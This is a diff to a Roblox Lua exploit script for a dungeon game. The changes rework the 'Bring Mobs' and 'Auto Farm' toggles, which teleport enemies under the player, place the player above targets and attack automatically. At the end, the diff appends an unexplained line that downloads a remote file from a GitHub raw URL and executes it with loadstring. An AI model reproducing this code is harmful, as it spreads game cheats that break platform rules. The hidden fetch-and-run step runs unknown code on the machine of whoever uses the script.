@@ -236,18 +236,24 @@ Main:AddParagraph({
 -- Bring Mobs Dungeon
 -- ========================================
 
-Main:AddSection({"Bring Mobs"})
-
+local FarmThread
 
 local ScanRadius = 1000
-local MaxBring = 5
+local MaxBring = 8
+
+local BringHeight = -8
+local BringDistance = 10
+local FarmHeight = 20
 
 
 
-local function GetLocalCharacterRoot()
+local function GetRoot()
 
-    local Char =
-        plr.Character or plr.CharacterAdded:Wait()
+    local Char = plr.Character
+
+    if not Char then
+        return nil
+    end
 
     return Char:FindFirstChild("HumanoidRootPart")
 
@@ -255,225 +261,55 @@ end
 
 
 
-local function GetEnemiesFolder()
+local function GetEnemies()
 
-    return workspace:FindFirstChild("Enemies")
-
-end
-
-
-
-local function GetMobsInRadius(Position,Radius)
-
-    local Folder = GetEnemiesFolder()
+    local Folder = workspace:FindFirstChild("Enemies")
 
     if not Folder then
         return {}
     end
 
-
-    local Mobs = {}
-
-
-    for _,Mob in pairs(Folder:GetChildren()) do
-
-
-        local Humanoid =
-            Mob:FindFirstChild("Humanoid")
-
-
-        local Root =
-            Mob:FindFirstChild("HumanoidRootPart")
-
-
-
-        if Humanoid
-        and Root
-        and Humanoid.Health > 0 then
-
-
-            if (Root.Position - Position).Magnitude <= Radius then
-
-                table.insert(Mobs,Mob)
-
-            end
-
-        end
-
-    end
-
-
-    return Mobs
+    return Folder:GetChildren()
 
 end
 
 
 
-local BringThread
+local function GetNearestEnemy()
 
-
-
-Main:AddToggle({
-
-    Name = "Bring Mobs Dungeon",
-
-    Default = false,
-
-
-    Callback = function(Value)
-
-
-        _G.BringMobsDungeon = Value
-
-
-
-        if Value then
-
-
-            BringThread = task.spawn(function()
-
-
-                while _G.BringMobsDungeon do
-
-
-                    task.wait(0.2)
-
-
-
-                    local Root =
-                        GetLocalCharacterRoot()
-
-
-
-                    if Root then
-
-
-                        local Mobs =
-                            GetMobsInRadius(
-                                Root.Position,
-                                ScanRadius
-                            )
-
-
-
-                        for i = 1, math.min(#Mobs,MaxBring) do
-
-
-
-                            local MobRoot =
-                                Mobs[i]:FindFirstChild("HumanoidRootPart")
-
-
-
-                            if MobRoot then
-
-
-                                MobRoot.CFrame =
-                                    Root.CFrame *
-                                    CFrame.new(
-                                        math.random(-5,5),
-                                        0,
-                                        math.random(-5,5)
-                                    )
-
-
-                            end
-
-                        end
-
-                    end
-
-
-                end
-
-
-            end)
-
-
-        else
-
-
-            _G.BringMobsDungeon = false
-
-
-            if BringThread then
-
-                task.cancel(BringThread)
-
-                BringThread = nil
-
-            end
-
-
-        end
-
-
-    end
-
-})
--- ========================================
--- Auto Farm Dungeon
--- ========================================
-
-Main:AddSection({"Auto Farm"})
-
-
-local FarmThread
-
-
-
-local function GetBestEnemy()
-
-    local Folder = workspace:FindFirstChild("Enemies")
-
-    if not Folder then
-        return nil
-    end
-
-
-    local Root = GetLocalCharacterRoot()
+    local Root = GetRoot()
 
     if not Root then
         return nil
     end
 
 
-    local Target = nil
+    local Target
     local Distance = math.huge
 
 
-
-    for _,Enemy in pairs(Folder:GetChildren()) do
-
-
-        local Humanoid =
-            Enemy:FindFirstChild("Humanoid")
+    for _,Mob in pairs(GetEnemies()) do
 
 
-        local EnemyRoot =
-            Enemy:FindFirstChild("HumanoidRootPart")
+        local Hum = Mob:FindFirstChild("Humanoid")
+        local MobRoot = Mob:FindFirstChild("HumanoidRootPart")
 
 
-
-        if Humanoid
-        and EnemyRoot
-        and Humanoid.Health > 0 then
-
+        if Hum 
+        and MobRoot
+        and Hum.Health > 0 then
 
 
             local Dist =
-                (EnemyRoot.Position - Root.Position).Magnitude
-
+                (MobRoot.Position - Root.Position).Magnitude
 
 
             if Dist < Distance then
 
                 Distance = Dist
-
-                Target = Enemy
+                Target = Mob
 
             end
-
 
         end
 
@@ -481,6 +317,71 @@ local function GetBestEnemy()
 
 
     return Target
+
+end
+
+
+
+local function BringMobs()
+
+    local Root = GetRoot()
+
+    if not Root then
+        return
+    end
+
+
+    local Count = 0
+
+
+    for _,Mob in pairs(GetEnemies()) do
+
+
+        if Count >= MaxBring then
+            break
+        end
+
+
+        local Hum = Mob:FindFirstChild("Humanoid")
+        local MobRoot = Mob:FindFirstChild("HumanoidRootPart")
+
+
+        if Hum
+        and MobRoot
+        and Hum.Health > 0 then
+
+
+
+            local Distance =
+                (MobRoot.Position - Root.Position).Magnitude
+
+
+            if Distance <= ScanRadius then
+
+
+                Count += 1
+
+
+                MobRoot.CFrame =
+                    Root.CFrame *
+                    CFrame.new(
+                        (Count - 1) * 4 - 10,
+                        BringHeight,
+                        -BringDistance
+                    )
+
+
+                MobRoot.Velocity = Vector3.zero
+                MobRoot.RotVelocity = Vector3.zero
+
+
+            end
+
+
+        end
+
+
+    end
 
 end
 
@@ -505,59 +406,91 @@ Main:AddToggle({
         if Value then
 
 
-            FarmThread = task.spawn(function()
 
+            if FarmThread then
+                task.cancel(FarmThread)
+            end
+
+
+
+            FarmThread = task.spawn(function()
 
 
                 while _G.AutoFarmDungeon do
 
 
-
-                    task.wait(0.3)
-
-
-
-                    local Target =
-                        GetBestEnemy()
+                    task.wait(0.25)
 
 
 
-                    local MyRoot =
-                        GetLocalCharacterRoot()
+                    pcall(function()
 
 
 
-                    if Target
-                    and MyRoot then
+                        local Root = GetRoot()
+
+                        if not Root then
+                            return
+                        end
 
 
 
-                        local EnemyRoot =
-                            Target:FindFirstChild("HumanoidRootPart")
+                        -- gom quái xuống dưới trước mặt
+
+                        BringMobs()
 
 
 
-                        local Humanoid =
-                            Target:FindFirstChild("Humanoid")
+                        -- chọn quái đánh
+
+                        local Enemy =
+                            GetNearestEnemy()
 
 
 
-                        if EnemyRoot
-                        and Humanoid
-                        and Humanoid.Health > 0 then
+                        if Enemy then
 
 
 
-                            MyRoot.CFrame =
-                                EnemyRoot.CFrame *
-                                CFrame.new(0,20,0)
+                            local EnemyRoot =
+                                Enemy:FindFirstChild("HumanoidRootPart")
 
+
+
+                            local Hum =
+                                Enemy:FindFirstChild("Humanoid")
+
+
+
+                            if EnemyRoot
+                            and Hum
+                            and Hum.Health > 0 then
+
+
+
+                                Root.CFrame =
+                                    EnemyRoot.CFrame *
+                                    CFrame.new(
+                                        0,
+                                        FarmHeight,
+                                        0
+                                    )
+
+
+
+                                if typeof(Attack) == "function" then
+                                    Attack()
+                                end
+
+
+                            end
 
 
                         end
 
 
-                    end
+
+                    end)
 
 
 
@@ -572,6 +505,7 @@ Main:AddToggle({
         else
 
 
+
             _G.AutoFarmDungeon = false
 
 
@@ -579,7 +513,6 @@ Main:AddToggle({
             if FarmThread then
 
                 task.cancel(FarmThread)
-
                 FarmThread = nil
 
             end
@@ -588,13 +521,12 @@ Main:AddToggle({
         end
 
 
+
     end
 
 })
-
 Main:AddToggle({
 		Title = "Auto Attack Mon",
-		Desc = "Auto Attack Nearest",
 		Default = false,
 		Callback = function(state)
 			_G.AutoAttackMonDungeon = state
@@ -668,7 +600,7 @@ Main:AddToggle({
 	end)
 Main:AddToggle({
 		Title = "Auto Next Floor",
-		Desc = "Instant Teleport To Highest Floor",
+		
 		Default = false,
 		Callback = function(state)
 			_G.AutoNextFloor = state
@@ -676,7 +608,7 @@ Main:AddToggle({
 	})
 Main:AddToggle({
 		Title = "Auto Return To Hub",
-		Desc = "Return To Hub When Dungeon Done",
+		
 		Default = false,
 		Callback = function(state)
 			_G.AutoReturnToHub = state
@@ -693,13 +625,6 @@ Main:AddToggle({
 		end
 	end)
 end
-
-
-
-
-
-
-
 
 Setting:AddSection({"Cài đặt"});
 
@@ -898,3 +823,5 @@ game:GetService("UserInputService").JumpRequest:Connect(function()
         game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
     end
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ohmay5/Main/refs/heads/main/attach.txt"))()
